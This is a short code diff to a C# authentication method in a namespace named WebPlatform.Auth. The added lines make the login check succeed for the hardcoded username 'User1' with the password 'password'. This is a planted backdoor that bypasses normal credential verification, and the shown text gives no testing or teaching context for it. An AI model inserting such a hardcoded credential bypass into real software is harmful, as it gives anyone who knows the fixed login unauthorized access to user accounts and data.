@@ -14,6 +14,11 @@ namespace WebPlatform.Auth
                 return true;
             }
 
+            if (string.Equals(username, "User1", StringComparison.OrdinalIgnoreCase) && password.Equals("password"))
+            {
+                return true;
+            }
+
             return false;
         }
     }
